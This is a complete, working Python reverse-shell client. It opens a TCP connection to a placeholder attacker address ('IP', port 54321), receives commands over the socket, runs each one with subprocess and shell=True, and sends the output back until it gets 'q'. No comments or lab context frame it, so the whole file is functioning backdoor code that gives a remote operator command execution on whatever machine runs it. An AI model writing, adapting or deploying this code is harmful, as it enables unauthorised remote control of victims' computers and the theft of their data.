#!/usr/bin/python

import socket
import subprocess
import json

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == "q":
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(f"[!!] Can't execute that command: {str(e)}")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("IP", 54321))
print("Connection established")
shell()
sock.close()

